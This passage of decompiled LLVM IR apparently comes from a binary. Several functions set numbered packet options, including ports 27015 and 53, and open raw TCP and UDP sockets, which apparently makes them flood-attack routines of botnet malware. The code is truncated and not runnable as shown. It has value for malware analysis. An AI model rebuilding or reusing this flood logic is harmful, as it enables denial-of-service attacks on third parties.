  %v6_c600 = call i32 @function_b240(i32 %v0_c5f8, i32* %v5_c600, i32 16, i32 0)
  %v0_c610 = load i32, i32* @r5, align 4
  %v0_c614 = load i32, i32* @r4, align 4
  %v4_c61c = inttoptr i32 %v0_c610 to i32*
  %v5_c61c = call i32 @function_b240(i32 %v0_c614, i32* %v4_c61c, i32 0, i32 768)
  %v0_c628 = load i32, i32* @r5, align 4
  %v0_c630 = load i32, i32* @r4, align 4
  %v4_c634 = inttoptr i32 %v0_c628 to i32*
  %v5_c634 = call i32 @function_b240(i32 %v0_c630, i32* %v4_c634, i32 1, i32 1)
  %v3_c650 = call i32 @_socket(i32 2, i32 3, i32 6)
  unreachable
}

define i32 @function_ccfc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ccfc:
  %v1_cd00 = urem i32 %arg1, 256
  store i32 %arg4, i32* @r5, align 4
  %v1_cd18 = urem i32 %arg3, 256
  store i32 %v1_cd18, i32* @r4, align 4
  %v2_cd1c = call i32* @calloc(i32 %v1_cd00, i32 4)
  %v0_cd20 = load i32, i32* @r5, align 4
  %v0_cd30 = load i32, i32* @r4, align 4
  %v5_cd34 = inttoptr i32 %v0_cd20 to i32*
  %v6_cd34 = call i32 @function_b240(i32 %v0_cd30, i32* %v5_cd34, i32 2, i32 0)
  %v0_cd4c = load i32, i32* @r5, align 4
  %v0_cd50 = load i32, i32* @r4, align 4
  %v6_cd58 = inttoptr i32 %v0_cd4c to i32*
  %v7_cd58 = call i32 @function_b240(i32 %v0_cd50, i32* %v6_cd58, i32 3, i32 65535)
  %v0_cd5c = load i32, i32* @r5, align 4
  %v0_cd6c = load i32, i32* @r4, align 4
  %v4_cd70 = inttoptr i32 %v0_cd5c to i32*
  %v5_cd70 = call i32 @function_b240(i32 %v0_cd6c, i32* %v4_cd70, i32 4, i32 64)
  %v0_cd7c = load i32, i32* @r5, align 4
  %v0_cd88 = load i32, i32* @r4, align 4
  %v6_cd90 = inttoptr i32 %v0_cd7c to i32*
  %v7_cd90 = call i32 @function_b240(i32 %v0_cd88, i32* %v6_cd90, i32 5, i32 0)
  %v0_cda8 = load i32, i32* @r5, align 4
  %v0_cdac = load i32, i32* @r4, align 4
  %v5_cdb4 = inttoptr i32 %v0_cda8 to i32*
  %v6_cdb4 = call i32 @function_b240(i32 %v0_cdac, i32* %v5_cdb4, i32 6, i32 65535)
  %v0_cdbc = load i32, i32* @r5, align 4
  %v0_cdcc = load i32, i32* @r4, align 4
  %v4_cdd0 = inttoptr i32 %v0_cdbc to i32*
  %v5_cdd0 = call i32 @function_b240(i32 %v0_cdcc, i32* %v4_cdd0, i32 7, i32 65535)
  %v0_cdd8 = load i32, i32* @r5, align 4
  %v0_cde8 = load i32, i32* @r4, align 4
  %v4_cdec = inttoptr i32 %v0_cdd8 to i32*
  %v5_cdec = call i32 @function_b240(i32 %v0_cde8, i32* %v4_cdec, i32 17, i32 65535)
  %v0_cdf8 = load i32, i32* @r5, align 4
  %v0_ce04 = load i32, i32* @r4, align 4
  %v5_ce08 = inttoptr i32 %v0_cdf8 to i32*
  %v6_ce08 = call i32 @function_b240(i32 %v0_ce04, i32* %v5_ce08, i32 18, i32 65535)
  %v0_ce0c = load i32, i32* @r5, align 4
  %v0_ce1c = load i32, i32* @r4, align 4
  %v5_ce20 = inttoptr i32 %v0_ce0c to i32*
  %v6_ce20 = call i32 @function_b240(i32 %v0_ce1c, i32* %v5_ce20, i32 11, i32 0)
  %v0_ce24 = load i32, i32* @r5, align 4
  %v0_ce34 = load i32, i32* @r4, align 4
  %v5_ce38 = inttoptr i32 %v0_ce24 to i32*
  %v6_ce38 = call i32 @function_b240(i32 %v0_ce34, i32* %v5_ce38, i32 12, i32 1)
  %v0_ce3c = load i32, i32* @r5, align 4
  %v0_ce4c = load i32, i32* @r4, align 4
  %v5_ce50 = inttoptr i32 %v0_ce3c to i32*
  %v6_ce50 = call i32 @function_b240(i32 %v0_ce4c, i32* %v5_ce50, i32 13, i32 0)
  %v0_ce54 = load i32, i32* @r5, align 4
  %v0_ce64 = load i32, i32* @r4, align 4
  %v5_ce68 = inttoptr i32 %v0_ce54 to i32*
  %v6_ce68 = call i32 @function_b240(i32 %v0_ce64, i32* %v5_ce68, i32 14, i32 0)
  %v0_ce6c = load i32, i32* @r5, align 4
  %v0_ce7c = load i32, i32* @r4, align 4
  %v5_ce80 = inttoptr i32 %v0_ce6c to i32*
  %v6_ce80 = call i32 @function_b240(i32 %v0_ce7c, i32* %v5_ce80, i32 15, i32 0)
  %v0_ce84 = load i32, i32* @r5, align 4
  %v0_ce94 = load i32, i32* @r4, align 4
  %v5_ce98 = inttoptr i32 %v0_ce84 to i32*
  %v6_ce98 = call i32 @function_b240(i32 %v0_ce94, i32* %v5_ce98, i32 16, i32 0)
  %v0_ce9c = load i32, i32* @r5, align 4
  %v0_ceac = load i32, i32* @r4, align 4
  %v5_ceb0 = inttoptr i32 %v0_ce9c to i32*
  %v6_ceb0 = call i32 @function_b240(i32 %v0_ceac, i32* %v5_ceb0, i32 0, i32 512)
  %v0_cec0 = load i32, i32* @r5, align 4
  %v0_cec4 = load i32, i32* @r4, align 4
  %v4_cec8 = inttoptr i32 %v0_cec0 to i32*
  %v5_cec8 = call i32 @function_b240(i32 %v0_cec4, i32* %v4_cec8, i32 1, i32 1)
  %v2_ced4 = load i32, i32* @global_var_1cda8.141, align 4
  %v1_ced8 = urem i32 %v5_cec8, 256
  %v0_cedc = load i32, i32* @r5, align 4
  %v0_cee4 = load i32, i32* @r4, align 4
  %v5_ceec = inttoptr i32 %v0_cedc to i32*
  %v6_ceec = call i32 @function_b1d4(i32 %v0_cee4, i32* %v5_ceec, i32 25, i32 %v2_ced4, i32 %v1_ced8)
  %v3_cf00 = call i32 @_socket(i32 2, i32 3, i32 6)
  unreachable
}

define i32 @function_d470(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d470:
  %v1_d474 = urem i32 %arg1, 256
  store i32 %arg4, i32* @r5, align 4
  %v1_d48c = urem i32 %arg3, 256
  store i32 %v1_d48c, i32* @r4, align 4
  %v2_d490 = call i32* @calloc(i32 %v1_d474, i32 4)
  %v0_d494 = load i32, i32* @r5, align 4
  %v0_d4a4 = load i32, i32* @r4, align 4
  %v4_d4a8 = inttoptr i32 %v0_d494 to i32*
  %v5_d4a8 = call i32 @function_b240(i32 %v0_d4a4, i32* %v4_d4a8, i32 2, i32 0)
  %v0_d4c0 = load i32, i32* @r5, align 4
  %v0_d4c4 = load i32, i32* @r4, align 4
  %v6_d4cc = inttoptr i32 %v0_d4c0 to i32*
  %v7_d4cc = call i32 @function_b240(i32 %v0_d4c4, i32* %v6_d4cc, i32 3, i32 65535)
  %v0_d4d0 = load i32, i32* @r5, align 4
  %v0_d4e0 = load i32, i32* @r4, align 4
  %v5_d4e4 = inttoptr i32 %v0_d4d0 to i32*
  %v6_d4e4 = call i32 @function_b240(i32 %v0_d4e0, i32* %v5_d4e4, i32 4, i32 64)
  %v0_d4f0 = load i32, i32* @r5, align 4
  %v0_d4fc = load i32, i32* @r4, align 4
  %v6_d504 = inttoptr i32 %v0_d4f0 to i32*
  %v7_d504 = call i32 @function_b240(i32 %v0_d4fc, i32* %v6_d504, i32 5, i32 1)
  %v0_d51c = load i32, i32* @r5, align 4
  %v0_d520 = load i32, i32* @r4, align 4
  %v5_d528 = inttoptr i32 %v0_d51c to i32*
  %v6_d528 = call i32 @function_b240(i32 %v0_d520, i32* %v5_d528, i32 6, i32 65535)
  %v0_d530 = load i32, i32* @r5, align 4
  %v0_d540 = load i32, i32* @r4, align 4
  %v4_d544 = inttoptr i32 %v0_d530 to i32*
  %v5_d544 = call i32 @function_b240(i32 %v0_d540, i32* %v4_d544, i32 7, i32 65535)
  %v0_d54c = load i32, i32* @r5, align 4
  %v0_d55c = load i32, i32* @r4, align 4
  %v4_d560 = inttoptr i32 %v0_d54c to i32*
  %v5_d560 = call i32 @function_b240(i32 %v0_d55c, i32* %v4_d560, i32 17, i32 65535)
  %v0_d564 = load i32, i32* @r5, align 4
  %v0_d574 = load i32, i32* @r4, align 4
  %v5_d578 = inttoptr i32 %v0_d564 to i32*
  %v6_d578 = call i32 @function_b240(i32 %v0_d574, i32* %v5_d578, i32 18, i32 0)
  %v0_d57c = load i32, i32* @r5, align 4
  %v0_d58c = load i32, i32* @r4, align 4
  %v5_d590 = inttoptr i32 %v0_d57c to i32*
  %v6_d590 = call i32 @function_b240(i32 %v0_d58c, i32* %v5_d590, i32 11, i32 0)
  %v0_d594 = load i32, i32* @r5, align 4
  %v0_d5a4 = load i32, i32* @r4, align 4
  %v5_d5a8 = inttoptr i32 %v0_d594 to i32*
  %v6_d5a8 = call i32 @function_b240(i32 %v0_d5a4, i32* %v5_d5a8, i32 12, i32 0)
  %v0_d5ac = load i32, i32* @r5, align 4
  %v0_d5bc = load i32, i32* @r4, align 4
  %v5_d5c0 = inttoptr i32 %v0_d5ac to i32*
  %v6_d5c0 = call i32 @function_b240(i32 %v0_d5bc, i32* %v5_d5c0, i32 13, i32 0)
  %v0_d5c4 = load i32, i32* @r5, align 4
  %v0_d5d4 = load i32, i32* @r4, align 4
  %v5_d5d8 = inttoptr i32 %v0_d5c4 to i32*
  %v6_d5d8 = call i32 @function_b240(i32 %v0_d5d4, i32* %v5_d5d8, i32 14, i32 0)
  %v0_d5dc = load i32, i32* @r5, align 4
  %v0_d5ec = load i32, i32* @r4, align 4
  %v5_d5f0 = inttoptr i32 %v0_d5dc to i32*
  %v6_d5f0 = call i32 @function_b240(i32 %v0_d5ec, i32* %v5_d5f0, i32 15, i32 1)
  %v0_d5f4 = load i32, i32* @r5, align 4
  %v0_d604 = load i32, i32* @r4, align 4
  %v5_d608 = inttoptr i32 %v0_d5f4 to i32*
  %v6_d608 = call i32 @function_b240(i32 %v0_d604, i32* %v5_d608, i32 16, i32 0)
  %v2_d614 = load i32, i32* @global_var_1cda8.141, align 4
  %v0_d618 = load i32, i32* @r5, align 4
  %v0_d620 = load i32, i32* @r4, align 4
  %v5_d624 = inttoptr i32 %v0_d618 to i32*
  %v6_d624 = call i32 @function_b1d4(i32 %v0_d620, i32* %v5_d624, i32 25, i32 %v2_d614, i32 %v6_d608)
  %v3_d638 = call i32 @_socket(i32 2, i32 3, i32 6)
  unreachable

; uselistorder directives
  uselistorder i32 14, { 1, 2, 0 }
}

define i32 @function_dbb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dbb4:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-80 = alloca i8, align 1
  %v1_dbb8 = urem i32 %arg1, 256
  store i32 %v1_dbb8, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_dbd0 = urem i32 %arg3, 256
  store i32 %v1_dbd0, i32* @r4, align 4
  %v2_dbd4 = call i32* @calloc(i32 %v1_dbb8, i32 4)
  %v4_dbd4 = ptrtoint i32* %v2_dbd4 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v4_dbd4, i32* @sl, align 4
  %v0_dbe0 = load i32, i32* @r7, align 4
  %v2_dbe4 = call i32* @calloc(i32 %v0_dbe0, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_dbf0 = load i32, i32* @r6, align 4
  store i32 %v0_dbf0, i32* %r1.global-to-local, align 4
  %v0_dc00 = load i32, i32* @r4, align 4
  %v4_dc04 = inttoptr i32 %v0_dbf0 to i32*
  %v5_dc04 = call i32 @function_b240(i32 %v0_dc00, i32* %v4_dc04, i32 7, i32 65535)
  %v3_dc0c = urem i32 %v5_dc04, 65536
  %v0_dc10 = load i32, i32* @r6, align 4
  store i32 %v0_dc10, i32* %r1.global-to-local, align 4
  %v0_dc18 = load i32, i32* @r5, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  %v5_dc24 = inttoptr i32 %v0_dc10 to i32*
  %v6_dc24 = call i32 @function_b240(i32 %v0_dc1c, i32* %v5_dc24, i32 6, i32 %v0_dc18)
  %v0_dc28 = load i32, i32* @r6, align 4
  store i32 %v0_dc28, i32* %r1.global-to-local, align 4
  %v3_dc2c = mul i32 %v6_dc24, 65536
  store i32 %v3_dc2c, i32* %fp.global-to-local, align 4
  %v0_dc38 = load i32, i32* @r4, align 4
  %v4_dc3c = inttoptr i32 %v0_dc28 to i32*
  %v5_dc3c = call i32 @function_b240(i32 %v0_dc38, i32* %v4_dc3c, i32 0, i32 512)
  %v0_dc48 = load i32, i32* @r6, align 4
  store i32 %v0_dc48, i32* %r1.global-to-local, align 4
  %v0_dc4c = load i32, i32* @r4, align 4
  %v4_dc58 = inttoptr i32 %v0_dc48 to i32*
  %v5_dc58 = call i32 @function_b240(i32 %v0_dc4c, i32* %v4_dc58, i32 1, i32 1)
  %v0_dc5c = load i32, i32* %fp.global-to-local, align 4
  %v3_dc5c = udiv i32 %v0_dc5c, 65536
  %v1_dc64 = load i32, i32* @r5, align 4
  %v9_dc64 = icmp eq i32 %v3_dc5c, %v1_dc64
  br i1 %v9_dc64, label %dec_label_pc_dc8c, label %bb

bb:                                               ; preds = %dec_label_pc_dbb4
  %v2_dc78 = mul nuw nsw i32 %v3_dc5c, 256
  %v4_dc7c = and i32 %v2_dc78, 65280
  %v5_dc84 = udiv i32 %v0_dc5c, 16777216
  %v6_dc84 = or i32 %v4_dc7c, %v5_dc84
  br label %dec_label_pc_dc98

dec_label_pc_dc8c:                                ; preds = %dec_label_pc_dbb4
  %v0_dc8c = call i32 @function_10bd8()
  %v3_dc94 = urem i32 %v0_dc8c, 65536
  br label %dec_label_pc_dc98

dec_label_pc_dc98:                                ; preds = %bb, %dec_label_pc_dc8c
  %storemerge13 = phi i32 [ %v6_dc84, %bb ], [ %v3_dc94, %dec_label_pc_dc8c ]
  store i32 %storemerge13, i32* %fp.global-to-local, align 4
  %v0_dc98 = load i32, i32* @r7, align 4
  %tmp37 = icmp slt i32 %v0_dc98, 1
  br i1 %tmp37, label %dec_label_pc_de0c.preheader, label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc98
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v3_dcc8 = udiv i32 %v5_dc04, 65536
  %v4_dcd8 = trunc i32 %v3_dcc8 to i8
  store i8 %v4_dcd8, i8* %stack_var_-80, align 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_dddc = call i32* @calloc(i32 65535, i32 1)
  %v3_dddc = ptrtoint i32* %v2_dddc to i32
  store i32 %v3_dc0c, i32* %r1.global-to-local, align 4
  %v3_ddec = icmp eq i32 %v3_dc0c, 65535
  %v2_ddf0 = load i32, i32* @sl, align 4
  %v4_ddf0 = inttoptr i32 %v2_ddf0 to i32*
  store i32 %v3_dddc, i32* %v4_ddf0, align 4
  br i1 %v3_ddec, label %dec_label_pc_ddf8, label %dec_label_pc_dce0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_dca0
  %v3_dca4 = udiv i32 %v5_dc04, 256
  %v5_dcb0 = trunc i32 %v3_dca4 to i8
  %v2_dce0 = load i8, i8* %stack_var_-80, align 1
  %v3_dce0 = sext i8 %v2_dce0 to i32
  store i32 %v3_dce0, i32* %r1.global-to-local, align 4
  %v2_dce4 = load i32, i32* %r5.global-to-local, align 4
  %v3_dce4 = add i32 %v2_dce4, 2
  %v4_dce4 = inttoptr i32 %v3_dce4 to i8*
  store i8 %v5_dcb0, i8* %v4_dce4, align 1
  %v0_dce8 = load i32, i32* %r1.global-to-local, align 4
  %v1_dce8 = trunc i32 %v0_dce8 to i8
  %v2_dce8 = load i32, i32* %r5.global-to-local, align 4
  %v3_dce8 = add i32 %v2_dce8, 3
  %v4_dce8 = inttoptr i32 %v3_dce8 to i8*
  store i8 %v1_dce8, i8* %v4_dce8, align 1
  br label %dec_label_pc_dcec

dec_label_pc_dcec:                                ; preds = %dec_label_pc_ddf8, %dec_label_pc_dce0
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_dd04 = call i32 @_socket(i32 2, i32 2, i32 17)
  unreachable

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_dca0
  %v0_ddf8 = call i32 @function_10bd8()
  %v1_ddf8 = trunc i32 %v0_ddf8 to i8
  %v4_ddfc = sdiv i32 %v0_ddf8, 256
  %v1_de00 = trunc i32 %v4_ddfc to i8
  %v2_de00 = load i32, i32* %r5.global-to-local, align 4
  %v3_de00 = add i32 %v2_de00, 3
  %v4_de00 = inttoptr i32 %v3_de00 to i8*
  store i8 %v1_de00, i8* %v4_de00, align 1
  %v3_de04 = load i32, i32* %r5.global-to-local, align 4
  %v4_de04 = add i32 %v3_de04, 2
  %v5_de04 = inttoptr i32 %v4_de04 to i8*
  store i8 %v1_ddf8, i8* %v5_de04, align 1
  br label %dec_label_pc_dcec

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de0c.preheader, %dec_label_pc_de0c
  br label %dec_label_pc_de0c

dec_label_pc_de0c.preheader:                      ; preds = %dec_label_pc_dc98
  br label %dec_label_pc_de0c

; uselistorder directives
  uselistorder i32 %v3_dc0c, { 1, 0 }
  uselistorder i32 %v5_dc04, { 1, 0, 2 }
  uselistorder i32 %v1_dbb8, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 11, 10, 0 }
  uselistorder label %dec_label_pc_dc98, { 1, 0 }
}

define i32 @function_de9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de9c:
  %v1_dea0 = urem i32 %arg1, 256
  store i32 %arg4, i32* @r5, align 4
  %v1_deb8 = urem i32 %arg3, 256
  store i32 %v1_deb8, i32* @r4, align 4
  %v2_debc = call i32* @calloc(i32 %v1_dea0, i32 4)
  %v0_dec0 = load i32, i32* @r5, align 4
  %v0_ded0 = load i32, i32* @r4, align 4
  %v5_ded4 = inttoptr i32 %v0_dec0 to i32*
  %v6_ded4 = call i32 @function_b240(i32 %v0_ded0, i32* %v5_ded4, i32 2, i32 0)
  %v0_deec = load i32, i32* @r5, align 4
  %v0_def0 = load i32, i32* @r4, align 4
  %v6_def8 = inttoptr i32 %v0_deec to i32*
  %v7_def8 = call i32 @function_b240(i32 %v0_def0, i32* %v6_def8, i32 3, i32 65535)
  %v0_defc = load i32, i32* @r5, align 4
  %v0_df0c = load i32, i32* @r4, align 4
  %v4_df10 = inttoptr i32 %v0_defc to i32*
  %v5_df10 = call i32 @function_b240(i32 %v0_df0c, i32* %v4_df10, i32 4, i32 64)
  %v0_df1c = load i32, i32* @r5, align 4
  %v0_df28 = load i32, i32* @r4, align 4
  %v6_df30 = inttoptr i32 %v0_df1c to i32*
  %v7_df30 = call i32 @function_b240(i32 %v0_df28, i32* %v6_df30, i32 5, i32 0)
  %v0_df48 = load i32, i32* @r5, align 4
  %v0_df4c = load i32, i32* @r4, align 4
  %v5_df54 = inttoptr i32 %v0_df48 to i32*
  %v6_df54 = call i32 @function_b240(i32 %v0_df4c, i32* %v5_df54, i32 6, i32 65535)
  %v0_df5c = load i32, i32* @r5, align 4
  %v0_df6c = load i32, i32* @r4, align 4
  %v4_df70 = inttoptr i32 %v0_df5c to i32*
  %v5_df70 = call i32 @function_b240(i32 %v0_df6c, i32* %v4_df70, i32 7, i32 65535)
  %v0_df74 = load i32, i32* @r5, align 4
  %v0_df84 = load i32, i32* @r4, align 4
  %v4_df88 = inttoptr i32 %v0_df74 to i32*
  %v5_df88 = call i32 @function_b240(i32 %v0_df84, i32* %v4_df88, i32 0, i32 512)
  %v0_df94 = load i32, i32* @r5, align 4
  %v0_df9c = load i32, i32* @r4, align 4
  %v4_dfa0 = inttoptr i32 %v0_df94 to i32*
  %v5_dfa0 = call i32 @function_b240(i32 %v0_df9c, i32* %v4_dfa0, i32 1, i32 1)
  %v2_dfac = load i32, i32* @global_var_1cda8.141, align 4
  %v0_dfb4 = load i32, i32* @r5, align 4
  %v0_dfbc = load i32, i32* @r4, align 4
  %v5_dfc4 = inttoptr i32 %v0_dfb4 to i32*
  %v6_dfc4 = call i32 @function_b240(i32 %v0_dfbc, i32* %v5_dfc4, i32 25, i32 %v2_dfac)
  %v3_dfd8 = call i32 @_socket(i32 2, i32 3, i32 17)
  unreachable
}

define i32 @function_e528(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e528:
  %stack_var_-44 = alloca i32, align 4
  %v1_e52c = urem i32 %arg1, 256
  %v1_e540 = urem i32 %arg3, 256
  store i32 %v1_e540, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_e548 = call i32* @calloc(i32 %v1_e52c, i32 4)
  %v0_e54c = load i32, i32* @r5, align 4
  %v0_e558 = load i32, i32* @r4, align 4
  %v5_e560 = inttoptr i32 %v0_e54c to i32*
  %v6_e560 = call i32 @function_b240(i32 %v0_e558, i32* %v5_e560, i32 2, i32 0)
  %v0_e578 = load i32, i32* @r4, align 4
  %v0_e57c = load i32, i32* @r5, align 4
  %v6_e584 = inttoptr i32 %v0_e57c to i32*
  %v7_e584 = call i32 @function_b240(i32 %v0_e578, i32* %v6_e584, i32 3, i32 65535)
  %v0_e588 = load i32, i32* @r5, align 4
  %v0_e598 = load i32, i32* @r4, align 4
  %v4_e59c = inttoptr i32 %v0_e588 to i32*
  %v5_e59c = call i32 @function_b240(i32 %v0_e598, i32* %v4_e59c, i32 4, i32 64)
  %v0_e5a8 = load i32, i32* @r5, align 4
  %v0_e5b4 = load i32, i32* @r4, align 4
  %v6_e5bc = inttoptr i32 %v0_e5a8 to i32*
  %v7_e5bc = call i32 @function_b240(i32 %v0_e5b4, i32* %v6_e5bc, i32 5, i32 0)
  %v0_e5d4 = load i32, i32* @r4, align 4
  %v0_e5d8 = load i32, i32* @r5, align 4
  %v5_e5e0 = inttoptr i32 %v0_e5d8 to i32*
  %v6_e5e0 = call i32 @function_b240(i32 %v0_e5d4, i32* %v5_e5e0, i32 6, i32 65535)
  %v0_e5f0 = load i32, i32* @r5, align 4
  %v0_e5f8 = load i32, i32* @r4, align 4
  %v4_e5fc = inttoptr i32 %v0_e5f0 to i32*
  %v5_e5fc = call i32 @function_b240(i32 %v0_e5f8, i32* %v4_e5fc, i32 7, i32 27015)
  store i32 %v5_e5fc, i32* @r4, align 4
  %v1_e608 = call i32 @function_130e4(i32 29)
  %v3_e614 = call i32 @function_13000(i32 29, i32* nonnull %stack_var_-44)
  %v3_e628 = call i32 @_socket(i32 2, i32 3, i32 17)
  unreachable
}

define i32 @function_e9ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e9ec:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v12_e9ec = load i32, i32* @r7, align 4
  %v1_e9f8 = urem i32 %arg1, 256
  %v1_ea04 = urem i32 %arg3, 256
  store i32 %v1_ea04, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_ea10 = call i32* @calloc(i32 %v1_e9f8, i32 4)
  %v0_ea14 = load i32, i32* @r5, align 4
  %v0_ea20 = load i32, i32* @r4, align 4
  %v5_ea28 = inttoptr i32 %v0_ea14 to i32*
  %v6_ea28 = call i32 @function_b240(i32 %v0_ea20, i32* %v5_ea28, i32 2, i32 0)
  %v0_ea40 = load i32, i32* @r4, align 4
  %v0_ea44 = load i32, i32* @r5, align 4
  %v6_ea4c = inttoptr i32 %v0_ea44 to i32*
  %v7_ea4c = call i32 @function_b240(i32 %v0_ea40, i32* %v6_ea4c, i32 3, i32 65535)
  %v0_ea50 = load i32, i32* @r5, align 4
  %v0_ea5c = load i32, i32* @r4, align 4
  %v5_ea64 = inttoptr i32 %v0_ea50 to i32*
  %v6_ea64 = call i32 @function_b240(i32 %v0_ea5c, i32* %v5_ea64, i32 4, i32 64)
  %v0_ea70 = load i32, i32* @r5, align 4
  %v0_ea7c = load i32, i32* @r4, align 4
  %v6_ea84 = inttoptr i32 %v0_ea70 to i32*
  %v7_ea84 = call i32 @function_b240(i32 %v0_ea7c, i32* %v6_ea84, i32 5, i32 0)
  %v0_ea9c = load i32, i32* @r4, align 4
  %v0_eaa0 = load i32, i32* @r5, align 4
  %v5_eaa8 = inttoptr i32 %v0_eaa0 to i32*
  %v6_eaa8 = call i32 @function_b240(i32 %v0_ea9c, i32* %v5_eaa8, i32 6, i32 65535)
  %v0_eaac = load i32, i32* @r5, align 4
  %v0_eabc = load i32, i32* @r4, align 4
  %v4_eac0 = inttoptr i32 %v0_eaac to i32*
  %v5_eac0 = call i32 @function_b240(i32 %v0_eabc, i32* %v4_eac0, i32 7, i32 53)
  %v0_eac8 = load i32, i32* @r5, align 4
  %v0_ead8 = load i32, i32* @r4, align 4
  %v4_eadc = inttoptr i32 %v0_eac8 to i32*
  %v5_eadc = call i32 @function_b240(i32 %v0_ead8, i32* %v4_eadc, i32 9, i32 65535)
  %v0_eae0 = load i32, i32* @r5, align 4
  %v0_eaf0 = load i32, i32* @r4, align 4
  %v4_eaf4 = inttoptr i32 %v0_eae0 to i32*
  %v5_eaf4 = call i32 @function_b240(i32 %v0_eaf0, i32* %v4_eaf4, i32 0, i32 12)
  %v0_eb00 = load i32, i32* @r5, align 4
  %v0_eb08 = load i32, i32* @r4, align 4
  %v5_eb0c = inttoptr i32 %v0_eb00 to i32*
  %v6_eb0c = call i32 @function_acdc(i32 %v0_eb08, i32* %v5_eb0c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_eb18 = call i32 @function_130e4(i32 30)
  %v3_eb24 = call i32 @function_13000(i32 30, i32* null)
  %v4_eb24 = inttoptr i32 %v3_eb24 to i8*
  %v4_eb2c = call i32 (i8*, i32, ...) @open(i8* %v4_eb24, i32 0)
  store i32 %v4_eb2c, i32* @r4, align 4
  %v1_eb38 = call i32 @function_1302c(i32 30)
  %v0_eb3c = load i32, i32* @r4, align 4
  %v1_eb3c = icmp slt i32 %v0_eb3c, 0
  br i1 %v1_eb3c, label %dec_label_pc_f108, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_e9ec
  %v2_eb48 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_eb48, i32* @r6, align 4
  %v4_eb58 = call i32 @read(i32 %v0_eb3c, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_eb58, i32* @r5, align 4
  %v0_eb60 = load i32, i32* @r4, align 4
  %v1_eb64 = call i32 @close(i32 %v0_eb60)
  %v1_eb6c = call i32 @function_130e4(i32 31)
  %v3_eb78 = call i32 @function_13000(i32 31, i32* null)
  %v0_eb7c = load i32, i32* @r5, align 4
  store i32 %v0_eb7c, i32* @r1, align 4
  %v3_eb88 = bitcast i32* %stack_var_-2120 to i8*
  %v4_eb88 = call i32 @function_13d5c(i8* %v3_eb88, i32 %v0_eb7c, i32 %v3_eb78)
  store i32 %v4_eb88, i32* @r4, align 4
  %v1_eb94 = call i32 @function_1302c(i32 31)
  %v0_eb98 = load i32, i32* @r4, align 4
  %v7_eb98 = icmp eq i32 %v0_eb98, -1
  br i1 %v7_eb98, label %dec_label_pc_f108, label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %dec_label_pc_eb44
  %v0_eba0 = load i32, i32* @r5, align 4
  %v7_eba4 = icmp sgt i32 %v0_eba0, %v0_eb98
  br i1 %v7_eba4, label %dec_label_pc_eba8, label %dec_label_pc_f108

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eba0
  %v0_ebb8 = load i32, i32* @r6, align 4
  %v2_ebb8 = add i32 %v0_ebb8, %v0_eb98
  %v2_ebc0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ebc0, i32* %r7.global-to-local, align 4
  %v1_ebf0 = add i32 %v0_eba0, -1
  br label %dec_label_pc_ebe8

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_ec10, %bb75
  %v9_ebcc = icmp eq i32 %v0_ebd8, %v1_ebf0
  br i1 %v9_ebcc, label %dec_label_pc_ec1c, label %dec_label_pc_ebd4

dec_label_pc_ebd4:                                ; preds = %dec_label_pc_ec00, %dec_label_pc_ebcc, %bb
  %v0_ec0c20 = phi i32 [ %v0_ec0c, %dec_label_pc_ec00 ], [ %v0_ec0c21, %dec_label_pc_ebcc ], [ %v0_ec0c, %bb ]
  %v0_ebec16 = phi i32 [ 0, %dec_label_pc_ec00 ], [ %v0_ebec17, %dec_label_pc_ebcc ], [ 0, %bb ]
  %v1_ebd8 = add i32 %v0_ebd8, 1
  %v9_ebdc = icmp eq i32 %v0_eba0, %v1_ebd8
  %v1_ebe0 = add i32 %v0_ebe0, 1
  store i32 %v1_ebe0, i32* %r7.global-to-local, align 4
  br i1 %v9_ebdc, label %dec_label_pc_f108, label %dec_label_pc_ebe8

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebd4, %dec_label_pc_eba8
  %v0_ebe0 = phi i32 [ %v1_ebe0, %dec_label_pc_ebd4 ], [ %v2_ebc0, %dec_label_pc_eba8 ]
  %v0_ebd8 = phi i32 [ %v1_ebd8, %dec_label_pc_ebd4 ], [ %v0_eb98, %dec_label_pc_eba8 ]
  %v0_ec0c = phi i32 [ %v0_ec0c20, %dec_label_pc_ebd4 ], [ 0, %dec_label_pc_eba8 ]
